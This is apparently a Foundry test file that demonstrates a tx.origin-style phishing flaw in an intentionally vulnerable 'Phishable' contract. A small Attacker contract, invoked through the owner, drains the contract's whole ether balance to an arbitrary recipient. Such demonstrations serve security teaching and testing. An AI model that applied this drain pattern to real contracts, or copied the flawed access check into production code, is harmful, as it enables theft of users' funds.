
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract Attacker {
    function attack(Phishable target, address payable recipient) public {
        target.withdrawAll(recipient);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        phishable = new Phishable(owner);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address payable recipient) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != phishable.owner());
        vm.assume(recipient != address(0));
        vm.assume(recipient != address(vm));
        vm.assume(recipient != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(recipient != address(phishable));
        vm.assume(caller != address(phishable));
        vm.assume(address(caller).code.length == 0);

        uint256 initialBalance = 1 ether;
        vm.deal(address(phishable), initialBalance);

        uint256 phishBalanceBefore = address(phishable).balance;
        uint256 recipBalanceBefore = address(recipient).balance;

        vm.etch(caller, type(Attacker).runtimeCode);

        vm.prank(owner);
        Attacker(caller).attack(phishable, recipient);

        assertEq(address(phishable).balance, 0);
        assertEq(address(recipient).balance, recipBalanceBefore + phishBalanceBefore);
    }
}
